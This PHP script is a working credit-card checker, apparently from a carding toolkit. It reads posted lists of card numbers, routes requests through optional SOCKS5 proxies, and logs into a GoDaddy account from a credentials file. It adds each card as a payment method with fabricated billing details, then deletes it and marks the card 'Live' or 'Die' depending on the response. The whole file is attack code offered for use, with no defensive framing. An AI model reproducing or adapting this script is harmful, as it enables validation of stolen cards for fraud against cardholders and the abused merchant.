<?php 		
    $thongtinnguoiviet = "Checked by Pro Demon";
	$mail = new Mail();
    $curl = new xuly_curl();
	//xoa_cookies();
	//xoa_cookies_all();	
	//$curl->trinhduyet(random_uagent_desktop());
$curl->trinhduyet("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

   //$curl->trinhduyet("Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/47.0.2526.70 Mobile/13C71 Safari/601.1.46");

//BỘ LỌC CC	
	$card = new card($_POST['listcc']);
	$cc = $card->card;  
 	 $type = $card->type("amex,visa,mastercard,discover,");
	 // $type = $card->type("1004,1000,1002,Discover,");
	$zipcc = $cc['zip'];
	$ccn = $cc['num'];
	$ccmon = $cc['mon'];
	$ccyear = $cc['year'];
	$cvv = $cc['cvv'];
	
if(!$cvv){
if ($type == 'AMERICAN_EXPRESS') {$cvv = "0000"; }
else { $cvv = "000"; }
}

	$randomusername = 'dm'.rand(1, 999999);
	
	 $emailok = 'demonpro'. time() . '@checker.cc';
     $pwdok = 'd3mon'.rand(1, 1000);
     $pin = rand(1000, 1000000);


		
 
		function selectccv($Cct){
			if($Cct == 3) return '0000';
			else return '000';	}
		function Balance($Balance)	{
			switch ($Balance)	{
				case 5:	$Value = "5";	break;
				case 10:	$Value = "10";	break;
				case 15:	$Value = "15";	break;
				case 20:	$Value = "20";	break;
				case 25:	$Value = "25";	break;		}
			return $Value;	}
		
   	if (!$type)
    {
        $result['thongbaoloi'] = -1;
        $result['msg'] = urldecode($_POST['listcc']);
        echo json_encode($result);
        exit;
    }
//END: BỘ LOC CC	

//THONG TIN RAMDOM NEU CAN   
   		$infoacc = new Info;		
		$first =  getRand(true, 4);
        $last =  getRand(true, 5);
		$domain =  getRand(true, 12);
        $mail = getEmail();		
 		$name1 = $infoacc->getFirstName();
		$name2 =$infoacc->getLastName();
		$name3 = $infoacc->getFirstName2();
		$name4 =$infoacc->getLastName2();
		$fullname =$infoacc->getFullName();		
		$diachine = $infoacc->getAddress();
		$cityne =$infoacc->getCity();
		$statene = $infoacc->getSt();
		if ($zipcc == "") $zipcc = $infoacc->getZipcode();		
		$phonene = $infoacc->getPhone1();
		$phonene2 =$infoacc->getPhone2();
		$statene1 = $infoacc->getState();
  		//THONG TIN RAMDOM NEU CAN 


    $sock = urldecode($_POST['sock']);	
	if($sock)	{
    $curl->sock5($sock);
	}


$sotienorder = $_POST['sotienorder'];

  
 if (checkMon($ccmon,1) < intval(date("n")) && checkYear($ccyear,4) <= intval(date("Y"))) {
$result['thongbaoloi'] = 2;
 $result['msg'] = '<b style="color:red;">Die</b> |' .$_POST['listcc']. "|".$thongtinnguoiviet;
  echo json_encode($result);
  exit;
}	
		
	
	/*
$checkzipcode = "http://www.unitedstateszipcodes.org/".$zipcc."/";
$curl->xemtrang($checkzipcode); 
$FILLZIPCODE = getStr($curl->xuatnoidung,'<h3>ZIP Code: ','<br>');
$city_get = trim(getStr($FILLZIPCODE,'</h3>',','));
$State_get = trim(getStr($FILLZIPCODE,', ',' '));
 LOC LAY FILLZIPCODE */

$checkzipcode = "http://www.zip-codes.com/zip-code/".$zipcc."/zip-code-".$zipcc.".asp";
$curl->xemtrang($checkzipcode); 
$city_get = trim(strip_tags(getStr($curl->xuatnoidung,'City:</a></td>','</td></tr>')));
$State_get_full = getStr($curl->xuatnoidung,'State:</a></td><td class="info">','</td></tr>');
$State_get1 = trim(strip_tags(getStr($State_get_full,'">',' ['))); //NY
$State_get2 = trim(strip_tags(getStr($State_get_full,' [',']'))); // New York

if($curl->kiemtraketnoi()){
	
	
	


//STEP: 1 LOGIN
	
$account = file_get_contents('account.txt');
list($username, $password) = explode("|", $account);

$header = array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type: application/x-www-form-urlencoded');
$curl->httpheader($header);

$post = "name=".$username."&password=".$password;
$curl->ref("https://www.godaddy.com/");
$curl->guipost($post);
$curl->xemtrang("https://sso.godaddy.com/?path=sso%2Freturn&app=www");
//file_put_contents('LOGIN1.html', $curl->xuatnoidung);
//file_put_contents('post.html', $post);
if($curl->kiemtraketnoi()){


$header = array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type: application/json');
$curl->httpheader($header);

$post = '{"paymentInstrument":{"type":"cc","creditCardData":{"cardHolderName":"'.$name1.' '.$name2.'","expMonth":"'.checkMon($ccmon,2).'","expYear":"'.checkYear($ccyear,4).'","creditCardType":"'.$type.'","creditCardNumber":"'.$ccn.'"},"giftCardData":null,"billTo":{"firstName":"'.$name1.'","middleName":"","lastName":"'.$name2.'","email":"'.$username.'@mail.com","phone1":"+1 714891'.rand(1000,9999).'","address1":"'.rand(1000,9999).' WESTSTATE ST","address2":"","city":"WESTMINSTER","state":"CA","zip":"92683","country":"US","company":""},"paypal":null},"currency":"USD","isDefault":true,"isBackup":false,"isExpired":false,"friendlyName":"","paymentNumberHash":"","associateAllProducts":null,"removeOldPayment":null,"deleteProfilesIds":null}';
$curl->ref("https://account.godaddy.com/payment-methods/add/details");
$curl->guipost($post);
$curl->xemtrang("https://mya.godaddy.com/webapi/paymentmethod");
//file_put_contents('ADDPAYMENT.html', $curl->xuatnoidung);
//file_put_contents('post2.html', $post);



if($curl->kiemtraketnoi()){
	
	if(stripos($curl->xuatnoidung, 'success":true') !== false  ){
		
//DEL CC 		
$idpayment = getStr($curl->xuatnoidung,'"id":','}');
$header = array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type: application/x-www-form-urlencoded');
$curl->httpheader($header);
$curl->xemtrang("https://account.godaddy.com/payment-methods/".$idpayment."/edit");
//file_put_contents('ID.html', $curl->xuatnoidung);

$Token = getStr($curl->xuatnoidung,'csrfToken":"','"');	
	
$header = array('Accept: */*','Content-Type: application/json','X-Requested-With: XMLHttpRequest','X-CSRF-Token: '.$Token);
$curl->httpheader($header);

$post = '{"deleteProfileIds":"'.$idpayment.'"}';
$curl->ref("https://account.godaddy.com/payment-methods/".$idpayment."/edit");
$curl->guipost($post);
$curl->xemtrang("https://account.godaddy.com/api/payment-methods/bulk-delete");
//file_put_contents('DEL.html', $curl->xuatnoidung);
//file_put_contents('post3.html', $post);		
//END: DEL CC 
		
		
$result['thongbaoloi'] = 0;				
$result['msg'] = '<b style="color:#009933;">Live</b> |' .$_POST['listcc']. "|".$thongtinnguoiviet;	
}	
			
									
elseif(stripos($curl->xuatnoidung, 'error":true') !== false){
$result['thongbaoloi'] = 2;
$result['msg'] = '<b style="color:red;">Die</b> |' .$_POST['listcc']. "|".$thongtinnguoiviet;
					}
	
					
	else {
		//$result['thongbaoloi'] = 1; $result['msg'] = $sock . ' | Die or Timeout';
file_put_contents('DIE2.html', $curl->xuatnoidung);
$result['thongbaoloi'] = 2;
$result['msg'] = '<b style="color:red;">Die 2</b> |' .$_POST['listcc']. "|".$thongtinnguoiviet;
}					
						
					


	
}else{ $result['thongbaoloi'] = 1; $result['msg'] = $sock . ' | Die or Timeout'; }
}else{ $result['thongbaoloi'] = 1; $result['msg'] = $sock . ' | Die or Timeout'; }
}else{ $result['thongbaoloi'] = 1; $result['msg'] = $sock . ' | Die or Timeout'; }


	xoa_cookies_all();	
	sleep($_POST['sleep']);
    echo json_encode($result);
    exit;
  

?>